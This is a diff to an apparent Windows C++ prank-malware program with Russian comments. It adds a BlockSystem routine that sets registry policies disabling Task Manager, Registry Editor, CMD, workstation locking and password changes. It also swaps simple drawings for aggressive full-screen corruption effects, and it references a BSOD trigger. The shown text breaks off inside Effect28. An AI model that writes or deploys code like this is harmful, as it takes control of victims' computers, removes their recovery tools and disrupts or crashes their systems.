@@ -28,7 +28,7 @@ using namespace std;
 int screenWidth = 0;
 int screenHeight = 0;
 bool isRunning = true;
-HINSTANCE hInst;
+int comboIntensity = 0;
 
 // ==================== ПРОТОТИПЫ ====================
 bool IsAdmin();
@@ -38,175 +38,260 @@ void GenerateSound(int freq, int duration);
 void PlayRandomSounds();
 void TriggerBSOD();
 void RunGDIEffects();
+void BlockSystem();
 
-// ==================== ВСЕ ЭФФЕКТЫ (45 штук) ====================
+// ==================== БЛОКИРОВКА СИСТЕМЫ ====================
+void BlockSystem() {
+    // Блокировка диспетчера задач
+    HKEY hKey;
+    if (RegCreateKeyEx(HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD value = 1;
+        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
+        RegSetValueEx(hKey, "DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
+        RegSetValueEx(hKey, "DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
+        RegCloseKey(hKey);
+    }
+    
+    // Блокировка редактора реестра
+    if (RegCreateKeyEx(HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD value = 1;
+        RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
+        RegCloseKey(hKey);
+    }
+    
+    // Блокировка CMD
+    if (RegCreateKeyEx(HKEY_CURRENT_USER,
+        "Software\\Policies\\Microsoft\\Windows\\System",
+        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD value = 2;
+        RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
+        RegCloseKey(hKey);
+    }
+}
 
-// 1. Шум
+// ==================== МЕГА-АГРЕССИВНЫЕ ЭФФЕКТЫ (20 шт) ====================
+
+// 1. КАША ИЗ ПИКСЕЛЕЙ - полный хаос
 void Effect1(HDC hdc, int w, int h) {
     int size = w * h;
     COLORREF* pixels = new COLORREF[size];
     for (int i = 0; i < size; i++) {
-        pixels[i] = RGB(rand() % 255, rand() % 255, rand() % 255);
+        int r = rand() % 256;
+        int g = rand() % 256;
+        int b = rand() % 256;
+        pixels[i] = RGB(r ^ (rand() % 255), g ^ (rand() % 255), b ^ (rand() % 255));
     }
     HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
     HDC mdc = CreateCompatibleDC(hdc);
     SelectObject(mdc, bmp);
-    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
+    BitBlt(hdc, 0, 0, w, h, mdc, rand() % 30 - 15, rand() % 30 - 15, SRCCOPY);
     DeleteDC(mdc);
     DeleteObject(bmp);
     delete[] pixels;
 }
 
-// 2. Вертикальные полосы
+// 2. RGB АД - мега-инверсия с цветами
 void Effect2(HDC hdc, int w, int h) {
-    for (int x = 0; x < w; x += 3) {
-        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        MoveToEx(hdc, x, 0, NULL);
-        LineTo(hdc, x, h);
-        DeleteObject(pen);
+    static int phase = 0;
+    phase += 5;
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    for (int y = 0; y < h; y += 2) {
+        for (int x = 0; x < w; x += 2) {
+            int color = (phase + x + y * 2) % 360;
+            SetPixel(hdc, x, y, RGB(
+                (int)(255 * sin(color * 3.14159 / 180 + phase)),
+                (int)(255 * sin((color + 120) * 3.14159 / 180 + phase * 0.7)),
+                (int)(255 * sin((color + 240) * 3.14159 / 180 + phase * 1.3))
+            ));
+        }
     }
+    BitBlt(hdc, 0, 0, w, h, mdc, rand() % 20 - 10, rand() % 20 - 10, NOTSRCCOPY);
+    DeleteDC(mdc);
+    DeleteObject(bmp);
 }
 
-// 3. Круги
+// 3. ПОЛНАЯ ТРЯСКА С РАЗРЫВАМИ
 void Effect3(HDC hdc, int w, int h) {
-    for (int i = 0; i < 50; i++) {
-        int cx = rand() % w;
-        int cy = rand() % h;
-        int rad = 5 + rand() % 100;
-        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
-        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        SelectObject(hdc, brush);
-        Ellipse(hdc, cx - rad, cy - rad, cx + rad, cy + rad);
-        DeleteObject(pen);
-        DeleteObject(brush);
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    for (int y = 0; y < h; y += 2) {
+        int offset = (rand() % 40 - 20) * (1 + sin(y * 0.05) * 2);
+        BitBlt(hdc, offset, y, w, 2, mdc, 0, y, SRCCOPY);
+        BitBlt(hdc, -offset/2, y+1, w, 1, mdc, 0, y+1, SRCCOPY);
     }
+    DeleteDC(mdc);
+    DeleteObject(bmp);
 }
 
-// 4. Инверсия
+// 4. СМЕЩЕНИЕ С НАЛОЖЕНИЕМ
 void Effect4(HDC hdc, int w, int h) {
     HDC mdc = CreateCompatibleDC(hdc);
     HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
     SelectObject(mdc, bmp);
     BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    int shiftX = rand() % 80 - 40;
+    int shiftY = rand() % 80 - 40;
+    BitBlt(hdc, shiftX, shiftY, w, h, mdc, 0, 0, SRCCOPY);
+    BitBlt(hdc, -shiftX/2, -shiftY/2, w, h, mdc, 0, 0, SRCCOPY);
+    BitBlt(hdc, shiftX/3, shiftY/3, w, h, mdc, 0, 0, SRCCOPY);
     BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
     DeleteDC(mdc);
     DeleteObject(bmp);
 }
 
-// 5. Сдвиг
+// 5. ИСКРИВЛЕНИЕ ЭКРАНА (волны с разрывами)
 void Effect5(HDC hdc, int w, int h) {
+    static int phase = 0;
+    phase += 3;
     HDC mdc = CreateCompatibleDC(hdc);
     HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
     SelectObject(mdc, bmp);
     BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
-    int shiftX = rand() % 40 - 20;
-    int shiftY = rand() % 40 - 20;
-    BitBlt(hdc, shiftX, shiftY, w, h, mdc, 0, 0, SRCCOPY);
+    
+    for (int y = 0; y < h; y++) {
+        int offsetX = (int)(40 * sin(y * 0.03 + phase * 0.1)) + (int)(20 * sin(y * 0.07 + phase * 0.15));
+        int offsetY = (int)(30 * cos(y * 0.04 + phase * 0.08));
+        BitBlt(hdc, offsetX, y + offsetY, w, 1, mdc, 0, y, SRCCOPY);
+        BitBlt(hdc, -offsetX/2, y - offsetY/2, w/2, 1, mdc, w/2, y, SRCCOPY);
+    }
     DeleteDC(mdc);
     DeleteObject(bmp);
 }
 
-// 6. Квадраты
+// 6. РАЗРЫВ ЭКРАНА НА БЛОКИ
 void Effect6(HDC hdc, int w, int h) {
-    for (int i = 0; i < 40; i++) {
-        int x = rand() % w;
-        int y = rand() % h;
-        int size = 10 + rand() % 100;
-        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, brush);
-        Rectangle(hdc, x, y, x + size, y + size);
-        DeleteObject(brush);
-    }
-}
-
-// 7. Линии к центру
-void Effect7(HDC hdc, int w, int h) {
-    int cx = w / 2;
-    int cy = h / 2;
-    for (int i = 0; i < 150; i++) {
-        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        MoveToEx(hdc, rand() % w, rand() % h, NULL);
-        LineTo(hdc, cx + rand() % 200 - 100, cy + rand() % 200 - 100);
-        DeleteObject(pen);
-    }
-}
-
-// 8. Спираль
-void Effect8(HDC hdc, int w, int h) {
-    int cx = w / 2, cy = h / 2;
-    int radius = 0;
-    HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
-    SelectObject(hdc, pen);
-    MoveToEx(hdc, cx, cy, NULL);
-    for (int i = 0; i < 150; i++) {
-        double angle = i * 0.15;
-        radius += 2;
-        int x = cx + (int)(radius * cos(angle));
-        int y = cy + (int)(radius * sin(angle));
-        LineTo(hdc, x, y);
-    }
-    DeleteObject(pen);
-}
-
-// 9. Звезды
-void Effect9(HDC hdc, int w, int h) {
-    for (int i = 0; i < 40; i++) {
-        int x = rand() % w;
-        int y = rand() % h;
-        int size = 5 + rand() % 25;
-        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, brush);
-        POINT pts[10];
-        for (int j = 0; j < 10; j++) {
-            double angle = j * 3.14159 / 5 - 3.14159 / 2;
-            int r = (j % 2 == 0) ? size : size / 2;
-            pts[j].x = x + (int)(r * cos(angle));
-            pts[j].y = y + (int)(r * sin(angle));
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    int blockSize = 10 + rand() % 30;
+    for (int x = 0; x < w; x += blockSize) {
+        for (int y = 0; y < h; y += blockSize) {
+            int dx = rand() % 80 - 40;
+            int dy = rand() % 80 - 40;
+            BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, SRCCOPY);
+            // Смешивание цветов в блоках
+            if (rand() % 3 == 0) {
+                BitBlt(hdc, x + dx/2, y + dy/2, blockSize/2, blockSize/2, mdc, x, y, NOTSRCCOPY);
+            }
         }
-        Polygon(hdc, pts, 10);
-        DeleteObject(brush);
     }
+    DeleteDC(mdc);
+    DeleteObject(bmp);
 }
 
-// 10. Заливка
+// 7. МАЗУХА (смешивание с отрицанием)
+void Effect7(HDC hdc, int w, int h) {
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    int offset = rand() % 100 - 50;
+    BitBlt(hdc, offset, 0, w, h, mdc, 0, 0, SRCCOPY);
+    BitBlt(hdc, -offset/2, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
+    BitBlt(hdc, 0, offset/3, w, h, mdc, 0, 0, SRCPAINT);
+    BitBlt(hdc, 0, -offset/3, w, h, mdc, 0, 0, SRCAND);
+    DeleteDC(mdc);
+    DeleteObject(bmp);
+}
+
+// 8. ГИПЕР-ИНВЕРСИЯ
+void Effect8(HDC hdc, int w, int h) {
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    for (int i = 0; i < 3; i++) {
+        int offX = rand() % 60 - 30;
+        int offY = rand() % 60 - 30;
+        BitBlt(hdc, offX, offY, w, h, mdc, 0, 0, NOTSRCCOPY);
+        BitBlt(hdc, -offX, -offY, w, h, mdc, 0, 0, NOTSRCCOPY);
+    }
+    DeleteDC(mdc);
+    DeleteObject(bmp);
+}
+
+// 9. СИНУСОИДНЫЙ РАЗРЫВ
+void Effect9(HDC hdc, int w, int h) {
+    static int phase = 0;
+    phase += 2;
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    for (int x = 0; x < w; x += 2) {
+        int yOffset = (int)(50 * sin(x * 0.02 + phase * 0.05)) + (int)(30 * sin(x * 0.05 + phase * 0.1));
+        for (int y = 0; y < h; y += 4) {
+            BitBlt(hdc, x + (int)(20 * sin(y * 0.03 + phase * 0.07)), y + yOffset, 4, 4, mdc, x, y, SRCCOPY);
+        }
+    }
+    DeleteDC(mdc);
+    DeleteObject(bmp);
+}
+
+// 10. РАДУЖНЫЙ ШУМ
 void Effect10(HDC hdc, int w, int h) {
-    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-    SelectObject(hdc, brush);
-    Rectangle(hdc, 0, 0, w, h);
-    DeleteObject(brush);
+    static int phase = 0;
+    phase += 3;
+    int size = w * h;
+    COLORREF* pixels = new COLORREF[size];
+    for (int i = 0; i < size; i++) {
+        int x = i % w, y = i / w;
+        int color = (phase + x * 2 + y * 3 + rand() % 20) % 360;
+        pixels[i] = RGB(
+            (int)(255 * sin(color * 3.14159 / 180 + phase * 0.5)),
+            (int)(255 * sin((color + 120) * 3.14159 / 180 + phase * 0.7)),
+            (int)(255 * sin((color + 240) * 3.14159 / 180 + phase * 0.3))
+        );
+    }
+    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
+    HDC mdc = CreateCompatibleDC(hdc);
+    SelectObject(mdc, bmp);
+    BitBlt(hdc, rand() % 20 - 10, rand() % 20 - 10, w, h, mdc, 0, 0, SRCCOPY);
+    DeleteDC(mdc);
+    DeleteObject(bmp);
+    delete[] pixels;
 }
 
-// 11. Эллипсы
+// 11. ЗЕРКАЛЬНЫЙ АД
 void Effect11(HDC hdc, int w, int h) {
-    for (int i = 0; i < 60; i++) {
-        int x1 = rand() % w;
-        int y1 = rand() % h;
-        int x2 = rand() % w;
-        int y2 = rand() % h;
-        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, brush);
-        Ellipse(hdc, min(x1, x2), min(y1, y2), max(x1, x2), max(y1, y2));
-        DeleteObject(brush);
-    }
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    int midX = w / 2, midY = h / 2;
+    BitBlt(hdc, 0, 0, midX, h, mdc, w - midX, 0, SRCCOPY);
+    BitBlt(hdc, midX, 0, midX, h, mdc, 0, 0, SRCCOPY);
+    BitBlt(hdc, 0, 0, w, midY, mdc, 0, h - midY, SRCCOPY);
+    BitBlt(hdc, 0, midY, w, midY, mdc, 0, 0, SRCCOPY);
+    
+    // Инвертируем некоторые части
+    BitBlt(hdc, midX/2, midY/2, midX/2, midY/2, mdc, 0, 0, NOTSRCCOPY);
+    DeleteDC(mdc);
+    DeleteObject(bmp);
 }
 
-// 12. Градиент
+// 12. ХАОТИЧЕСКИЕ ЛИНИИ
 void Effect12(HDC hdc, int w, int h) {
-    for (int y = 0; y < h; y += 2) {
-        HBRUSH brush = CreateSolidBrush(RGB((y * 255) / h, rand() % 255, rand() % 255));
-        RECT rect = {0, y, w, y + 2};
-        FillRect(hdc, &rect, brush);
-        DeleteObject(brush);
-    }
-}
-
-// 13. Линии
-void Effect13(HDC hdc, int w, int h) {
-    for (int i = 0; i < 300; i++) {
-        HPEN pen = CreatePen(PS_SOLID, rand() % 4 + 1, RGB(rand() % 255, rand() % 255, rand() % 255));
+    for (int i = 0; i < 500; i++) {
+        HPEN pen = CreatePen(PS_SOLID, rand() % 10 + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
         SelectObject(hdc, pen);
         MoveToEx(hdc, rand() % w, rand() % h, NULL);
         LineTo(hdc, rand() % w, rand() % h);
@@ -214,358 +299,191 @@ void Effect13(HDC hdc, int w, int h) {
     }
 }
 
-// 14. Арки
-void Effect14(HDC hdc, int w, int h) {
-    for (int i = 0; i < 40; i++) {
-        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
-        DeleteObject(pen);
-    }
-}
-
-// 15. Сетка
-void Effect15(HDC hdc, int w, int h) {
-    for (int x = 0; x < w; x += 15 + rand() % 30) {
-        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        MoveToEx(hdc, x, 0, NULL);
-        LineTo(hdc, x, h);
-        DeleteObject(pen);
-    }
-    for (int y = 0; y < h; y += 15 + rand() % 30) {
-        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        MoveToEx(hdc, 0, y, NULL);
-        LineTo(hdc, w, y);
-        DeleteObject(pen);
-    }
-}
-
-// 16. Прямоугольники
-void Effect16(HDC hdc, int w, int h) {
+// 13. РАЗРЫВ НА ПОЛОСЫ
+void Effect13(HDC hdc, int w, int h) {
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
     for (int i = 0; i < 50; i++) {
-        int x1 = rand() % w;
-        int y1 = rand() % h;
-        int x2 = rand() % w;
-        int y2 = rand() % h;
-        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, brush);
-        Rectangle(hdc, min(x1, x2), min(y1, y2), max(x1, x2), max(y1, y2));
-        DeleteObject(brush);
-    }
-}
-
-// 17. Точки
-void Effect17(HDC hdc, int w, int h) {
-    for (int i = 0; i < 1500; i++) {
-        SetPixel(hdc, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-    }
-}
-
-// 18. Треугольники
-void Effect18(HDC hdc, int w, int h) {
-    for (int i = 0; i < 40; i++) {
-        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, brush);
-        POINT pts[3];
-        pts[0].x = rand() % w;
-        pts[0].y = rand() % h;
-        pts[1].x = rand() % w;
-        pts[1].y = rand() % h;
-        pts[2].x = rand() % w;
-        pts[2].y = rand() % h;
-        Polygon(hdc, pts, 3);
-        DeleteObject(brush);
-    }
-}
-
-// 19. Диагонали
-void Effect19(HDC hdc, int w, int h) {
-    for (int i = 0; i < 150; i++) {
-        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        int x = rand() % w;
         int y = rand() % h;
-        MoveToEx(hdc, x, y, NULL);
-        LineTo(hdc, x + rand() % 300 - 150, y + rand() % 300 - 150);
-        DeleteObject(pen);
+        int height = 5 + rand() % 20;
+        int offset = rand() % 200 - 100;
+        BitBlt(hdc, offset, y, w, height, mdc, 0, y, SRCCOPY);
+        BitBlt(hdc, -offset/2, y + height, w/2, height/2, mdc, w/2, y, NOTSRCCOPY);
     }
+    DeleteDC(mdc);
+    DeleteObject(bmp);
 }
 
-// 20. Концентрические круги
-void Effect20(HDC hdc, int w, int h) {
-    int cx = w / 2, cy = h / 2;
-    for (int rad = 10; rad < w / 2; rad += 15) {
-        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SelectObject(hdc, pen);
-        Ellipse(hdc, cx - rad, cy - rad, cx + rad, cy + rad);
-        DeleteObject(pen);
-    }
-}
-
-// 21. Волны
-void Effect21(HDC hdc, int w, int h) {
+// 14. МЕГА-СПИРАЛЬ
+void Effect14(HDC hdc, int w, int h) {
     static int phase = 0;
     phase += 2;
+    int cx = w / 2, cy = h / 2;
+    HPEN pen = CreatePen(PS_SOLID, 3, RGB(rand() % 256, rand() % 256, rand() % 256));
+    SelectObject(hdc, pen);
+    MoveToEx(hdc, cx, cy, NULL);
+    for (int i = 0; i < 300; i++) {
+        double angle = i * 0.05 + phase * 0.02;
+        int radius = i * 2;
+        int x = cx + (int)(radius * cos(angle));
+        int y = cy + (int)(radius * sin(angle));
+        LineTo(hdc, x, y);
+        if (i % 10 == 0) {
+            DeleteObject(pen);
+            pen = CreatePen(PS_SOLID, 2 + rand() % 5, RGB(rand() % 256, rand() % 256, rand() % 256));
+            SelectObject(hdc, pen);
+        }
+    }
+    DeleteObject(pen);
+}
+
+// 15. ВЗРЫВ ПИКСЕЛЕЙ
+void Effect15(HDC hdc, int w, int h) {
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    int cx = w / 2 + rand() % 200 - 100;
+    int cy = h / 2 + rand() % 200 - 100;
+    int radius = 50 + rand() % 200;
+    
     for (int x = 0; x < w; x += 2) {
-        int y = h / 2 + (int)(50 * sin(x * 0.02 + phase * 0.1));
-        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
+        for (int y = 0; y < h; y += 2) {
+            int dx = x - cx, dy = y - cy;
+            int dist = (int)sqrt(dx*dx + dy*dy);
+            if (dist < radius) {
+                int offset = (int)((radius - dist) * 0.5);
+                int nx = x + (dx * offset / (dist + 1));
+                int ny = y + (dy * offset / (dist + 1));
+                BitBlt(hdc, nx, ny, 2, 2, mdc, x, y, SRCCOPY);
+            }
+        }
+    }
+    DeleteDC(mdc);
+    DeleteObject(bmp);
+}
+
+// 16. ТРОЙНАЯ ИНВЕРСИЯ
+void Effect16(HDC hdc, int w, int h) {
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    BitBlt(hdc, 0, 0, w/3, h, mdc, 0, 0, NOTSRCCOPY);
+    BitBlt(hdc, w/3, 0, w/3, h, mdc, w/3, 0, NOTSRCCOPY);
+    BitBlt(hdc, 2*w/3, 0, w/3, h, mdc, 2*w/3, 0, NOTSRCCOPY);
+    
+    BitBlt(hdc, 0, h/3, w, h/3, mdc, 0, h/3, NOTSRCCOPY);
+    BitBlt(hdc, 0, 2*h/3, w, h/3, mdc, 0, 2*h/3, NOTSRCCOPY);
+    
+    DeleteDC(mdc);
+    DeleteObject(bmp);
+}
+
+// 17. КАЛЕЙДОСКОП
+void Effect17(HDC hdc, int w, int h) {
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    int segments = 6 + rand() % 6;
+    for (int i = 0; i < segments; i++) {
+        double angle = 2 * 3.14159 * i / segments;
+        int cx = w / 2, cy = h / 2;
+        int x1 = cx + (int)(w * cos(angle));
+        int y1 = cy + (int)(h * sin(angle));
+        int x2 = cx + (int)(w * cos(angle + 3.14159 / segments));
+        int y2 = cy + (int)(h * sin(angle + 3.14159 / segments));
+        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 256, rand() % 256, rand() % 256));
         SelectObject(hdc, pen);
-        MoveToEx(hdc, x, y - 50, NULL);
-        LineTo(hdc, x, y + 50);
+        MoveToEx(hdc, cx, cy, NULL);
+        LineTo(hdc, x1, y1);
+        LineTo(hdc, x2, y2);
+        LineTo(hdc, cx, cy);
         DeleteObject(pen);
     }
-}
-
-// 22. Снегопад
-void Effect22(HDC hdc, int w, int h) {
-    static vector<pair<int,int>> snow;
-    if (snow.empty()) {
-        for (int i = 0; i < 500; i++) {
-            snow.push_back({rand() % w, rand() % h});
-        }
-    }
-    HDC mdc = CreateCompatibleDC(hdc);
-    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
-    SelectObject(mdc, bmp);
-    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
-    
-    for (auto& p : snow) {
-        p.second += 2 + rand() % 3;
-        if (p.second > h) p.second = 0;
-        SetPixel(mdc, p.first, p.second, RGB(255, 255, 255));
-        SetPixel(mdc, p.first + 1, p.second, RGB(200, 200, 255));
-    }
-    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
+    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
     DeleteDC(mdc);
     DeleteObject(bmp);
 }
 
-// 23. Блоки
-void Effect23(HDC hdc, int w, int h) {
+// 18. РАЗРЫВ НА КВАДРАТЫ (жесткий)
+void Effect18(HDC hdc, int w, int h) {
     HDC mdc = CreateCompatibleDC(hdc);
     HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
     SelectObject(mdc, bmp);
     BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
     
-    int blockSize = 20 + rand() % 60;
+    int blockSize = 5 + rand() % 15;
     for (int x = 0; x < w; x += blockSize) {
         for (int y = 0; y < h; y += blockSize) {
-            int dx = rand() % 30 - 15;
-            int dy = rand() % 30 - 15;
-            BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, SRCCOPY);
+            int dx = rand() % 60 - 30;
+            int dy = rand() % 60 - 30;
+            if (rand() % 2) {
+                BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, NOTSRCCOPY);
+            } else {
+                BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, SRCCOPY);
+            }
+            if (rand() % 3 == 0) {
+                BitBlt(hdc, x - dx/2, y - dy/2, blockSize/2, blockSize/2, mdc, x, y, SRCAND);
+            }
         }
     }
     DeleteDC(mdc);
     DeleteObject(bmp);
 }
 
-// 24. Мозаика
-void Effect24(HDC hdc, int w, int h) {
-    int blockSize = 15 + rand() % 40;
-    for (int x = 0; x < w; x += blockSize) {
-        for (int y = 0; y < h; y += blockSize) {
-            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-            SelectObject(hdc, brush);
-            Rectangle(hdc, x, y, x + blockSize, y + blockSize);
-            DeleteObject(brush);
+// 19. БЕЛЫЙ ШУМ + ИНВЕРСИЯ
+void Effect19(HDC hdc, int w, int h) {
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    for (int i = 0; i < w * h; i += 3) {
+        int x = i % w, y = i / w;
+        if (rand() % 2) {
+            SetPixel(hdc, x, y, RGB(255, 255, 255));
+        } else {
+            SetPixel(hdc, x, y, RGB(0, 0, 0));
         }
     }
+    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
+    DeleteDC(mdc);
+    DeleteObject(bmp);
 }
 
-// 25. Радуга
-void Effect25(HDC hdc, int w, int h) {
-    static int hue = 0;
-    hue += 2;
-    for (int x = 0; x < w; x++) {
-        int color = (hue + x * 360 / w) % 360;
-        HPEN pen = CreatePen(PS_SOLID, 1, RGB(
-            (int)(128 + 127 * sin(color * 3.14159 / 180)),
-            (int)(128 + 127 * sin((color + 120) * 3.14159 / 180)),
-            (int)(128 + 127 * sin((color + 240) * 3.14159 / 180))
+// 20. РАЗРЫВ С ГРАДИЕНТОМ
+void Effect20(HDC hdc, int w, int h) {
+    static int phase = 0;
+    phase += 3;
+    HDC mdc = CreateCompatibleDC(hdc);
+    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(mdc, bmp);
+    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+    
+    for (int y = 0; y < h; y += 2) {
+        int offset = (int)(50 * sin(y * 0.03 + phase * 0.08)) + (int)(30 * sin(y * 0.07 + phase * 0.12));
+        int color = (phase + y * 2) % 360;
+        HPEN pen = CreatePen(PS_SOLID, 2, RGB(
+            (int)(255 * sin(color * 3.14159 / 180)),
+            (int)(255 * sin((color + 120) * 3.14159 / 180)),
+            (int)(255 * sin((color + 240) * 3.14159 / 180))
         ));
         SelectObject(hdc, pen);
-        MoveToEx(hdc, x, 0, NULL);
-        LineTo(hdc, x, h);
+        MoveToEx(hdc, offset, y, NULL);
+        LineTo(hdc, w + offset/2, y);
         DeleteObject(pen);
+        BitBlt(hdc, offset/3, y, w/2, 2, mdc, 0, y, NOTSRCCOPY);
     }
-}
-
-// 26. Vertical Wide (из твоих файлов) - растягивание по вертикали
-void Effect26(HDC hdc, int w, int h) {
-    StretchBlt(hdc, 0, -20, w, h + 40, hdc, 0, 0, w, h, SRCCOPY);
-}
-
-// 27. Wide (из твоих файлов) - растягивание по горизонтали
-void Effect27(HDC hdc, int w, int h) {
-    StretchBlt(hdc, -20, 0, w + 40, h, hdc, 0, 0, w, h, SRCCOPY);
-}
-
-// 28. Sine Waves (из твоих файлов)
-void Effect28(HDC hdc, int w, int h) {
-    static double angle = 0;
-    angle += 0.05;
-    for (float i = 0; i < w + h; i += 0.99f) {
-        int a = (int)(sin(angle) * 20);
